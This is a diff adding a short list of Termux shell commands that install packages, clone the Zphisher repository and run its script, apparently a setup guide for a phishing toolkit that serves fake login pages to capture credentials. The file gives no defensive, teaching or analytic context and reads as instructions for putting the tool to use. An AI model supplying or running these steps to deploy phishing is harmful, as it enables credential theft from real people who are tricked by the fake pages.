@@ -1,0 +1,16 @@
+Termux Zphisher Installation Commands:-
+
+$apt upgrade
+$apt update
+$pkg install git
+$pkg install wget
+$pkg install php
+$pkg install openssh
+$pkg install curl
+$pkg install python
+$apt install perl
+$pip install requests
+$git clone https://github.com/htr-tech/zphisher
+$cd zphisher
+$chmod +x zphisher.sh
+$bash zphisher.sh
